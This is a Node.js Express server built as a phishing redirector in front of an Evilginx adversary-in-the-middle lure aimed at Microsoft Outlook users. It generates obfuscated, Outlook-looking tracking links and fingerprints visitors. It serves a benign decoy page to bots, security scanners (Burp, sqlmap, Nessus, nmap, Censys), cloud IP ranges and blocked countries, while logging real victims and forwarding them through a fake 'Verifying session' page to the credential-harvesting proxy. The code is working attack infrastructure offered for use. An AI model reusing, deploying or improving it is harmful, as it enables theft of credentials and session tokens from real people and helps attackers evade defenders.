const express = require('express');
const base64 = require('base-64');
const helmet = require('helmet');
const fs = require('fs');
const rateLimit = require('express-rate-limit');
const crypto = require('crypto');
const fetch = require('node-fetch'); // npm install node-fetch@2
const path = require('path');

const app = express();

app.set('trust proxy', 1);

// Serve static files from public directory (for verify.js)
app.use(express.static(path.join(__dirname, 'public')));

// Config
const EVILGINX_LURE = process.env.EVILGINX_LURE || 'https://www.microsoft.com';
const TURNSTILE_SITEKEY = process.env.TURNSTILE_SITEKEY || 'YOUR_TURNSTILE_SITEKEY';
const TURNSTILE_SECRET = process.env.TURNSTILE_SECRET || 'YOUR_TURNSTILE_SECRET';
const USE_TURNSTILE_RAW = process.env.USE_TURNSTILE || 'false'; // default off for testing
const LOG_FILE = 'clicks.log';

const ALLOWED_COUNTRIES = (process.env.ALLOWED_COUNTRIES || '').toUpperCase().split(',').filter(c => c.trim());
const BLOCKED_COUNTRIES = (process.env.BLOCKED_COUNTRIES || '').toUpperCase().split(',').filter(c => c.trim());
const GEO_API_URL = process.env.GEO_API_URL || 'https://ipapi.co/{ip}/country/';

const PORT = process.env.PORT || 3000; // Render sets PORT=10000 automatically

const useTurnstile = USE_TURNSTILE_RAW === 'true' ||
                     USE_TURNSTILE_RAW === '1' ||
                     (USE_TURNSTILE_RAW !== 'false' && USE_TURNSTILE_RAW !== '0' &&
                      TURNSTILE_SITEKEY && TURNSTILE_SITEKEY !== 'YOUR_TURNSTILE_SITEKEY');

app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString('hex');
  next();
});

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`],
      imgSrc: ["'self'", 'data:'],
      styleSrc: ["'self'"],
      // Add more as needed
    }
  }
}));

app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true }));

// Health check for Render
app.get(['/ping', '/health', '/healthz', '/status'], (req, res) => res.status(200).send('OK'));

const strictLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 4,
  message: 'Rate limit exceeded',
  standardHeaders: true,
  legacyHeaders: false,
});

const suspiciousUA = [
  /headless/i, /phantom/i, /slurp/i, /zgrab/i, /scanner/i, /bot/i,
  /crawler/i, /spider/i, /burp/i, /sqlmap/i, /nessus/i, /censys/i,
  /zoomeye/i, /nmap/i, /gobuster/i
];

function isLikelyBot(req) {
  const ua = (req.headers['user-agent'] || '').toLowerCase();
  const ref = (req.headers['referer'] || '').toLowerCase();
  const accept = req.headers['accept'] || '';

  let score = 0;
  if (suspiciousUA.some(r => r.test(ua))) score += 25;
  if (!ua.includes('mozilla')) score += 12;
  if (ua.includes('compatible ;') || ua.includes('windows nt 5')) score += 10;
  if (ref && !['outlook', 'office', 'microsoft', 'live.com', 'hotmail'].some(r => ref.includes(r))) score += 10;
  if (!accept.includes('text/html')) score += 8;
  if (['13.', '52.', '35.', '34.', '3.'].some(p => req.ip.startsWith(p))) score += 12;
  if (!req.headers['sec-fetch-site'] || !req.headers['sec-fetch-mode']) score += 20;
  if (!req.headers['accept-language']) score += 12;
  if (!req.headers['dnt']) score += 8;
  if (Object.keys(req.headers).join() === Object.keys(req.headers).sort().join()) score += 18;

  console.log(`[BOT] ${req.ip} | Score: ${score}`);
  return score >= 40;
}

// Get country code
async function getCountryCode(req) {
  if (req.headers['cf-ipcountry']) return req.headers['cf-ipcountry'].toUpperCase();

  const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 'unknown';
  if (ip === 'unknown' || ip.startsWith('127.') || ip.startsWith('::1')) return 'XX';

  try {
    const res = await fetch(GEO_API_URL.replace('{ip}', ip), { timeout: 3000 });
    if (res.ok) return (await res.text()).trim().toUpperCase();
  } catch (err) {
    console.log(`[GEO FAIL] ${ip} | ${err.message}`);
  }
  return 'XX';
}

// Turnstile verification endpoint (kept but not used since useTurnstile=false)
app.post('/turnstile-verify', async (req, res) => {
  const { token } = req.body;
  const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 'unknown';

  if (!token) return res.status(400).json({ success: false });

  try {
    const form = new URLSearchParams({ secret: TURNSTILE_SECRET, response: token, remoteip: ip });
    const verify = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
      method: 'POST',
      body: form,
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
    });
    const result = await verify.json();
    res.json({ success: result.success });
  } catch {
    res.status(500).json({ success: false });
  }
});

// Fingerprint endpoint
app.post('/fingerprint', (req, res) => {
  const data = req.body;
  const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 'unknown';
  const ua = req.headers['user-agent'] || 'unknown';

  let score = 0;
  if (!data.canvas || data.canvas.includes('iVBORw0KGgo')) score += 30;
  if (['swiftshader','angle','llvmpipe','software'].some(b => data.webglRenderer?.toLowerCase().includes(b))) score += 40;
  if (data.hardwareConcurrency <= 2) score += 20;
  if (data.deviceMemory <= 4) score += 15;
  if (/mobile/i.test(ua) && data.touchPoints === 0) score += 25;
  if (data.timezone === 'UTC' && /en/i.test(ua)) score += 15;
  if (data.pluginsLength > 5 || data.mimeTypesLength > 10) score += 20;

  console.log(`[FP] ${ip} | Score: ${score}`);
  res.json({ status: 'ok', score });
});

// Generate obfuscated link
app.get('/generate', (req, res) => {
  const target = req.query.target || 'https://outlook.office.com/mail/';
  const noisy = target + '#' + crypto.randomBytes(8).toString('hex') + '-' + Date.now();
  let enc = base64.encode(noisy);
  enc = encodeURIComponent(enc);
  let doubleEnc = enc.replace(/%/g, '%25');
  const finalEnc = encodeURIComponent(doubleEnc);

  const segments = [];
  for (let i = 0; i < 6; i++) {
    segments.push(crypto.randomBytes(8).toString('hex') + Math.random().toString(36).substring(2, 12).toUpperCase() + (i % 2 ? 'verify' : 'session'));
  }

  const path = `/r/${segments.join('/')}/${crypto.randomBytes(12).toString('hex')}`;

  const params = [];
  const keys = ['sid', 'tok', 'ref', 'utm_src', 'clid', 'ver', 'ts', 'hmac', 'nonce', '_t', 'cid', 'fid'];
  for (let i = 0; i < 12; i++) {
    const k = keys[i % keys.length] + (i > 6 ? '_' + (i + 1) : '');
    const v = encodeURIComponent(crypto.randomBytes(10 + Math.floor(Math.random() * 20)).toString('base64url').repeat(2));
    params.push(`${k}=${v}`);
  }

  const url = `https://${req.hostname}${path}?p=${finalEnc}&v=6.9.${Math.floor(Math.random()*100)}&ts=${Date.now().toString(36).toUpperCase()}&h=${crypto.randomBytes(20).toString('hex')}&${params.join('&')}&z=${encodeURIComponent(crypto.randomBytes(16).toString('base64'))}`;

  console.log(`[GENERATED] ${url.length} chars → ${target}`);
  res.json({ success: true, tracked: url, length: url.length });
});

// Main tracked route
app.get('/r/*', strictLimiter, async (req, res) => {
  const ua = req.headers['user-agent'] || '';
  const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 'unknown';

  const country = await getCountryCode(req);

  let geoAllowed = true;
  if (ALLOWED_COUNTRIES.length) geoAllowed = ALLOWED_COUNTRIES.includes(country);
  if (BLOCKED_COUNTRIES.includes(country)) geoAllowed = false;

  const benignPage = `<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>Outlook</title><style>body{font-family:'Segoe UI',sans-serif;background:#fff;}.hdr{background:#0078d4;color:#fff;padding:12px;}.cnt{padding:24px;}</style></head><body><div class="hdr">Outlook</div><div class="cnt"><h1>Loading inbox...</h1><p>Please wait.</p></div></body></html>`;

  if (!geoAllowed || isLikelyBot(req)) {
    const reason = !geoAllowed ? 'GEO_BLOCKED' : 'BOT_BLOCK';
    fs.appendFile(LOG_FILE, `${new Date().toISOString()} ${reason} ${ip} ${country}\n`, () => {});
    return res.status(200).send(benignPage);
  }

  fs.appendFile(LOG_FILE, `${new Date().toISOString()} ACCESS ${ip} ${country} ${ua}\n`, () => {});

  // Safe decoding of ?p= parameter
  let redirectTarget = EVILGINX_LURE;
  try {
    const query = req.url.split('?')[1] || '';
    const params = new URLSearchParams(query);
    let enc = params.get('p') || '';
    if (enc) {
      let s1 = decodeURIComponent(enc).replace(/%25/g, '%');
      let s2 = decodeURIComponent(s1);
      let decoded = Buffer.from(s2, 'base64').toString('utf-8');

      const hashIdx = decoded.indexOf('#');
      if (hashIdx !== -1) decoded = decoded.substring(0, hashIdx);

      if (!/^https?:\/\//i.test(decoded)) {
        decoded = 'https://' + decoded;
      }

      const urlObj = new URL(decoded);
      if (urlObj.protocol === 'http:' || urlObj.protocol === 'https:') {
        redirectTarget = decoded;
      }
    }
  } catch (err) {
    console.error(`${new Date().toISOString()} DECODE_ERROR ${ip} | ${err.message}`);
  }

  const safeTarget = redirectTarget.replace(/'/g, "\\'").replace(/\\/g, "\\\\");

  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Session Verification</title>
  <style>
    body { font-family: system-ui, sans-serif; background:#f3f2f1; margin:0; display:flex; align-items:center; justify-content:center; min-height:100vh; color:#333; }
    .box { background:white; padding:40px; border-radius:12px; box-shadow:0 4px 20px rgba(0,0,0,0.1); text-align:center; max-width:400px; }
    .spin { border:5px solid #ddd; border-top:5px solid #0067c5; border-radius:50%; width:48px; height:48px; animation:spin 1s linear infinite; margin:0 auto 20px; }
    @keyframes spin { to { transform:rotate(360deg); } }
    h2 { margin:0 0 16px; }
    p { margin:0 0 24px; color:#555; }
  </style>
</head>
<body>
  <div class="box">
    <div class="spin"></div>
    <h2>Verifying session</h2>
    <p>Please wait...</p>
  </div>

  <script nonce="${res.locals.nonce}">
    window.REDIRECT_TARGET = '${safeTarget}';
  </script>
  <script src="/verify.js"></script>
</body>
</html>
  `);
});

app.use((req, res) => res.redirect('https://www.microsoft.com'));

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
});
